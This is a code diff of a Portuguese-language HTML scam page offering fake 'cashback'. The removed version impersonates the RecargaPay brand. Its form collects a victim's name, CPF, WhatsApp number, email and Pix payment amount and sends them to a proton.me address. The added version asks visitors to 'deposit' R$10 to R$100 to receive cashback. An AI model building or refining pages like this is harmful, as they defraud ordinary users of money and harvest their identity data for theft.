@@ -4,85 +4,35 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Promoção Cashback RecargaPay</title>
+  <title>Promoção Cashback</title>
   <style>
-    * {
-      box-sizing: border-box;
-    }
     body {
       font-family: Arial, sans-serif;
-      margin: 0;
-      padding: 0;
       background: linear-gradient(to bottom, #ffffff, #d6f0ff);
-      color: #333;
-    }
-    .container {
-      max-width: 100%;
-      padding: 30px 20px;
       text-align: center;
+      padding: 40px 20px;
     }
-    h1 {
-      color: #0070f3;
-    }
-    .box {
-      background: #f9f9f9;
-      border-radius: 10px;
-      padding: 30px;
-      margin-top: 20px;
-      box-shadow: 0 0 10px rgba(0,0,0,0.1);
-    }
-    form {
-      text-align: left;
-      margin-top: 20px;
-    }
-    input[type="text"], input[type="email"] {
-      width: 100%;
-      padding: 10px;
-      margin: 10px 0;
-      border: 1px solid #ccc;
-      border-radius: 5px;
-      font-size: 16px;
-    }
-    .cta {
-      display: inline-block;
-      margin-top: 20px;
-      padding: 15px 25px;
-      font-size: 18px;
+    h1 { color: #0070f3; }
+    .btn {
+      background: #00c853;
       color: white;
-      background-color: #0070f3;
+      padding: 15px 25px;
+      margin: 15px;
+      display: inline-block;
+      border-radius: 10px;
       text-decoration: none;
-      border-radius: 8px;
-      border: none;
+      font-size: 20px;
     }
-    .cta:hover {
-      background-color: #0059c1;
+    .btn:hover {
+      background: #009a3e;
     }
   </style>
 </head>
 <body>
-  <div class="container">
-    <h1>Ganhe R$50 de Cashback!</h1>
-    <div class="box">
-      <p>Cadastre-se abaixo para validar seu CPF e vincular seu cashback na carteira RecargaPay.</p>
-      <form action="mailto:recargapay@proton.me" method="post" enctype="text/plain">
-        <label>Nome completo:</label>
-        <input type="text" name="nome" required>
-
-        <label>CPF:</label>
-        <input type="text" name="cpf" required>
-
-        <label>WhatsApp:</label>
-        <input type="text" name="whatsapp" placeholder="11916744991" required>
-
-        <label>E-mail:</label>
-        <input type="email" name="email" placeholder="recargapay@proton.me" required>
-
-        <label>Valor do Pix enviado:</label>
-        <input type="text" name="valor" placeholder="R$ 50,00" required>
-
-        <input type="submit" class="cta" value="Validar e Receber Cashback">
-      </form>
-    </div>
-  </div>
+  <h1>Escolha um valor e receba seu cashback</h1>
+  <a class="btn" href="valor10.html">Depositar R$10</a>
+  <a class="btn" href="valor25.html">Depositar R$25</a>
+  <a class="btn" href="valor50.html">Depositar R$50</a>
+  <a class="btn" href="valor100.html">Depositar R$100</a>
 </body>
 </html>
